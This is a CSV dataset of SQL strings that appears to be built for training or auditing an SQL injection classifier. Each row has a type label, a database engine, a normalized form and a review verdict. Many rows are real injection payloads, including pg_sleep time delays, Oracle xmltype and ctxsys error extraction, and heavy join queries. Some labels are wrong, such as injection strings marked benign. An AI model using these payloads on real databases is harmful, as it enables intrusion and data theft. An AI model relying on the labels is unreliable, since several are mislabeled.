payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
SELECT * FROM known WHERE layers = 'opinion' OR arrange = 'fed',benign,generic,1.0,Normal SELECT with multiple WHERE conditions,opinion' OR arrange = 'fed,True,1,__IDENT__,KEEP,
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_3_text' LIMIT 1,benign,mysql,0.9,not_sql_injection,SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_3_text' LIMIT 1,False,0,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,RELABEL,reasoning too short (17 chars)
SELECT away ( s ) FROM clothing FULL OUTER JOIN,benign,mysql,0.9,not_sql_injection,SELECT away ( s ) FROM clothing FULL OUTER JOIN,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ __IDENT__ outer join,RELABEL,reasoning too short (17 chars)
"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'efpc' like 'efpc",time_blind,postgresql,0.7,regexp_substring,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'efpc' like 'efpc",False,0,"__INT__ ( select ( case when ( __INT__ = __INT__ ) then __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) else char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) end ) from information_schema . __IDENT__ ) and __IDENT__",RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5)
"SELECT value,handsome FROM thus WHERE entire = 'street' UNION SELECT refer, me FROM tribe",benign,generic,1.0,Normal SELECT with UNION and WHERE,"SELECT value,handsome FROM thus WHERE entire = 'street' UNION SELECT refer, me FROM tribe",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",RELABEL,benign payload contains 'union' (likely false negative)
1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,boolean_blind,generic,0.5,where_equality,1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,False,0,__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,RELABEL,reasoning too short (14 chars); confidence too low (0.50)
3.89139E+15,benign,generic,0.9,not_sql_injection,3.89139E+15,False,0,__INT__.89139e + __INT__,RELABEL,reasoning too short (17 chars)
SELECT * FROM ( SELECT paid FROM cook ),benign,generic,1.0,Normal SELECT with subquery,SELECT * FROM ( SELECT paid FROM cook ),False,0,select * from ( select __IDENT__ from __IDENT__ ),KEEP,
"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" and username = ""1\' ) )",error_based,oracle,0.75,Oracle simple WHERE injection,"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" and username = ""1\' ) )",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = ""__INT__\' ) )",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
juan,benign,generic,0.9,not_sql_injection,juan,False,0,__IDENT__,DROP,payload too short (4 chars)
SELECT * FROM fierce WHERE valley NOT LIKE '[can]%',benign,generic,1.0,Normal SELECT with NOT LIKE pattern,SELECT * FROM fierce WHERE valley NOT LIKE '[can]%',False,0,select * from __IDENT__ where __IDENT__ not like __STR__,KEEP,
"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd"" and username = ""1\' ) as wpmv where 1479 = 1479",error_based,postgresql,0.9,cast for PostgreSQL injection,"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd"" and username = ""1\' ) as wpmv where 1479 = 1479",False,0,"select * from __IDENT__ where __IDENT__ = -__INT__\' ) ) or __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) and ( ( \'__IDENT__\' like \'__IDENT__ and __IDENT__ = ""__INT__\' ) as __IDENT__ where __INT__ = __INT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,False,0,__INT__' where __INT__ = __INT__ and __INT__ = ( select __INT__ from pg_sleep ( __INT__ ) ) --,KEEP,
morlanes funosa,benign,generic,0.9,not_sql_injection,morlanes funosa,False,0,__IDENT__ __IDENT__,RELABEL,reasoning too short (17 chars)
castrillo de la valduerna,benign,generic,0.9,not_sql_injection,castrillo de la valduerna,False,0,__IDENT__ __IDENT__ __IDENT__ __IDENT__,RELABEL,reasoning too short (17 chars)
SELECT * FROM noun WHERE NOT rod = 'younger' AND NOT for = 'balance',benign,generic,1.0,Normal SELECT with NOT AND conditions,SELECT * FROM noun WHERE NOT rod = 'younger' AND NOT for = 'balance',False,0,select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,KEEP,
-5258 ) or ( 8459 = 8459 ) *4906,boolean_blind,generic,0.5,arithmetic,-5258 ) or ( 8459 = 8459 ) *4906,False,0,-__INT__ ) or ( __INT__ = __INT__ ) * __INT__,RELABEL,reasoning too short (10 chars); confidence too low (0.50)
"select * from users WHERE username = ""-9553 ) ) and username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,error_based,oracle,0.95,xmltype for Oracle error extraction,"-9553 ) ) and username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,"-__INT__ ) ) and __IDENT__ = ""__INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",heavy_query,mssql,0.7,mssql_sysjoin,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'holo' = 'holo",False,0,1__STR__holo__STR__holo,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4)
"1 ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,"1 ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,"__INT__ ) ) ) or __INT__ = ( select __IDENT__ ( * ) from __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ ) --",KEEP,
"select * from users WHERE username = ""1%\' and \'%\' = \'"" or username = ""-1641\' ) ) and username = ""-5863"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'%\' = \'""",error_based,oracle,0.9,Oracle xmltype case-based,"-1641\' ) ) and username = ""-5863"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'%\' = \'",True,1,-__INT__\' ) ) and __IDENT__ = __STR__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( ( \' % \' = \',KEEP,
SELECT * FROM pull 3 SELECT * FROM topic,benign,generic,1.0,Invalid SQL syntax - not an attack,SELECT * FROM pull 3 SELECT * FROM topic,False,0,select * from __IDENT__ __INT__ select * from __IDENT__,KEEP,
"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" or username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,Oracle xmltype for error extraction,"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" or username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = ""__INT__ ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555 ) ) +'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555 ) ) +'",False,0,1__STR__,KEEP,
"SELECT * FROM scared WHERE hunter IN ( 'dress', 'birds', 'loose' )",benign,generic,1.0,Normal SELECT with IN clause,"SELECT * FROM scared WHERE hunter IN ( 'dress', 'birds', 'loose' )",False,0,"select * from __IDENT__ where __IDENT__ in ( __STR__ , __STR__ , __STR__ )",KEEP,
"1"" ) where 3679 = 3679",boolean_blind,generic,0.8,WHERE equality for blind,"1"" ) where 3679 = 3679",False,0,"__INT__"" ) where __INT__ = __INT__",KEEP,
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,benign,generic,1.0,Normal SQL SELECT FETCH,SELECT * FROM glass FETCH FIRST 3 ROWS ONLY,False,0,select * from __IDENT__ __IDENT__ __IDENT__ __INT__ __IDENT__ __IDENT__,KEEP,
"select * from users WHERE username = ""1 ) ) or username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'""",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,"1 ) ) or username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",True,1,"__INT__ ) ) or __IDENT__ = ""-__INT__ % \' ) ) ) or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and ( ( ( \' % \' = \'",KEEP,
SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,benign,generic,1.0,Normal SELECT with FETCH FIRST,SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,False,0,select * from __IDENT__ __IDENT__ __IDENT__ __INT__ __IDENT__ __IDENT__ __IDENT__,KEEP,
"select * from users WHERE username = ""1 ) and ( ( ( \'%\' = \'"" or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""1 ) and ( ( ( \'%\' = \'"" or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ),RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"SELECT column_name ( s ) FROM without,saved",benign,generic,1.0,Normal SELECT with function and FROM,"SELECT column_name ( s ) FROM without,saved",False,0,"select __IDENT__ ( __IDENT__ ) from __IDENT__ , __IDENT__",KEEP,
"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'""",error_based,oracle,0.95,Oracle xmltype error extraction,1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\',True,1,__INT__\' || ( select \'__IDENT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) ) || \',KEEP,
"callejon sur, 93 13-c",benign,generic,0.9,not_sql_injection,"callejon sur, 93 13-c",False,0,"__IDENT__ __IDENT__ , __INT__ __INT__-__IDENT__",RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""-5863"" and username = ""1%"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7720 ) ) and ( ( 8254 = 8254""",error_based,oracle,0.95,Oracle XMLType error extraction,"1%"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7720 ) ) and ( ( 8254 = 8254",True,1,__INT__ % __STR__-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- __STR__-__INT__ ) ) and ( ( __INT__ = __INT__,KEEP,
"select * from users WHERE username = ""-9668\' ) ) as orfu where 5822 = 5822 and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'""",error_based,oracle,0.95,xmltype for Oracle error extraction,"-9668\' ) ) as orfu where 5822 = 5822 and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'",True,1,"-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = ""__INT__\' + ( select \'__IDENT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) ) + \'",KEEP,
"-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",out_of_band,oracle,0.9,ctxsys_drithsx,"-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",False,0,"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) --",RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6)
"select * from users WHERE username = ""-1254"" and username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\'|| ( select \'yucg\' where 2576 = 2576",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""-1254"" and username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\'|| ( select \'yucg\' where 2576 = 2576",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- and __IDENT__ = ""__INT__\' || ( select \'__IDENT__\' where __INT__ = __INT__",KEEP,
"SELECT * FROM users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" AND username = ""1\'+ ( select oljg where 2006 = 2006",auth_bypass,generic,0.6,wildcard injection,"SELECT * FROM users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" AND username = ""1\'+ ( select oljg where 2006 = 2006",False,0,"select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = ""__INT__\' + ( select __IDENT__ where __INT__ = __INT__",RELABEL,reasoning too short (18 chars); confidence too low (0.60)
